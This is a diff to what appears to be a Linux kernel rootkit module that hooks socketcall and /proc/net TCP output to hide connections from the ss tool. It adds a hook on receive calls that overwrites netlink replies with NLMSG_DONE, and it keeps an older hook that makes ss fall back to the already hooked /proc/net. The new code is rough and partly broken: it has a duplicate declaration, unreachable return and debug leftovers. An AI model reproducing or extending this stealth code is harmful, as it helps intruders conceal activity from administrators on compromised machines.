@@ -131,6 +131,36 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
 asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
     // when a socket gets opened with exaclty the arguments which ss uses, return -1
     // returning -1 causes ss to try it via /proc/net, which we already hooked
+    //struct msghdr* msg = (void*)&(((unsigned int*)args)[1]);
+    //struct iovec* iov = msg->msg_iov;
+    //char *buf = iov->iov_base;
+    //struct nlmsghdr* h = (struct nlmsghdr*)buf;
+    long retval = orig_socketcall(call, args);
+    struct sockaddr_in sin;
+    int fd = args[0];
+    int len;
+    long tmp;
+    if(call == SYS_RECVMSG){
+    //printk(KERN_INFO "%d vs. %d\n", h->nlmsg_type, NLMSG_DONE);
+	//h->nlmsg_seq = ~h->nlmsg_seq;
+	//h->nlmsg_type=0;
+	printk(KERN_INFO "SYS_RECVMSG\n");
+	len = sizeof(sin);
+	tmp = ((asmlinkage long (*)(int, struct sockaddr __user*, int __user*))ptr_sys_getpeername)(fd, (struct sockaddr*)&sin, &len);
+	if (tmp < 0){
+	    printk(KERN_INFO "Error retrieving port number.\n");
+	}
+	printk(KERN_INFO "port no: %d\n", ntohs(sin.sin_port));
+	((char*)args)[48] = NLMSG_DONE;
+	int fd = *(int*)args;
+    }
+    return retval;
+    return orig_socketcall(call, args);
+}
+
+asmlinkage long hooked_socketcall_old_version(int call, unsigned long __user* args){
+    // when a socket gets opened with exaclty the arguments which ss uses, return -1
+    // returning -1 causes ss to try it via /proc/net, which we already hooked
     if(call == SYS_SOCKET && args[0] == AF_NETLINK && args[1] == SOCK_RAW && args[2] == NETLINK_INET_DIAG)
         return -1;
     return orig_socketcall(call, args);
